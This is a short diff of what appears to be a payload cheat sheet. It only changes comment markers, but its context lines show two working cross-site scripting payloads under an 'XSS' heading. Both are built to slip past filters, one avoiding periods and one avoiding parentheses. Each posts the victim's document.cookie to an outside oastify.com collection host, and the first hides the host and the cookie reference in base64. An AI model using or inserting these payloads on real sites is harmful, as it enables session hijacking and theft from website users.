@@ -13,10 +13,10 @@
 # XSS
 
 ```js
-\\ No periods (.)
+// No periods (.)
 "-fetch(atob('aHR0cHM6Ly91cW8yODdieDV0OWppbWxidDJ3eXFqd3pjcWloNjd1dy5vYXN0aWZ5LmNvbQ=='), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
 
-\\ No parentheses
+// No parentheses
 "-eval.call`${"fetch\x28'https://waagi9etcsuh1f1p7hm33j41osujia6z.oastify.com', {method: 'POST', mode: 'no-cors', body: document.cookie}\x29"}`-"
 ```
 
